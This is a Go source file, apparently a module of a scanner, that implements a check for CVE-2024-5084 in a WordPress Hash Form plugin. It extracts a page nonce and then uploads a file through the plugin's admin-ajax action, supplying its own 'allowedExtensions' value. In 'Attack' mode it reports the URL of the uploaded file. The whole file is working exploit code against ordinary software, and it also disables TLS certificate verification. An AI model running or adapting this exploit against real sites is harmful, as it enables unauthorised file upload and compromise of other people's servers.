package CVEs

import (
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"net/http"
	"regexp"
	"strconv"
	"strings"
	"time"
)

func CVE_2024_5084(url string, Attack bool) error {
	randomNumber := generateRandomNumber()
	randomString := strconv.Itoa(randomNumber)
	// 创建自定义的 Transport(禁用SSL)
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{
		Transport: tr,
		Timeout:   10 * time.Second, // 设置超时时间为 10 秒
	}

	//fmt.Println("test")
	request, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return err
	}
	response, err := client.Do(request)
	if err != nil {
		return err
	}

	body, err := ioutil.ReadAll(response.Body)
	if err != nil {
		return err
	}
	re := regexp.MustCompile(`"ajax_nounce":"([^"]+)"`)
	res := re.FindStringSubmatch(string(body))

	var ajaxNounce string

	if len(res) >= 2 {
		ajaxNounce = res[1]
	} else {
		return nil
	}

	url2 := fmt.Sprintf("%s/wp-admin/admin-ajax.php?action=hashform_file_upload_action&file_uploader_nonce=%s&allowedExtensions%%5B0%%5D=txt&sizeLimit=1048576&qqfile=ycxlo%s.txt", url, ajaxNounce, randomString)
	//fmt.Println(url2)
	request2, err := http.NewRequest("POST", url2, strings.NewReader("123456"))
	if err != nil {
		return err
	}
	request2.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	request2.Header.Add("Content-Length", fmt.Sprint(strings.NewReader("123456").Len()))

	response2, err := client.Do(request2)
	body2, err := ioutil.ReadAll(response2.Body)
	if err != nil {
		return err
	}
	//fmt.Println(string(body2))

	if response2.StatusCode == http.StatusOK && strings.Contains(string(body2), fmt.Sprintf("ycxlo%s.txt", randomString)) && strings.Contains(string(body2), "success") {
		fmt.Println("[*]CVE-2024-5084 : " + url)
		if Attack {
			fmt.Println("Attack-Result : " + url + fmt.Sprintf("/wp-content/uploads/hashform/temp/ycxlo%s.txt\n", randomString))
		}
	}

	defer response.Body.Close()

	return nil
}
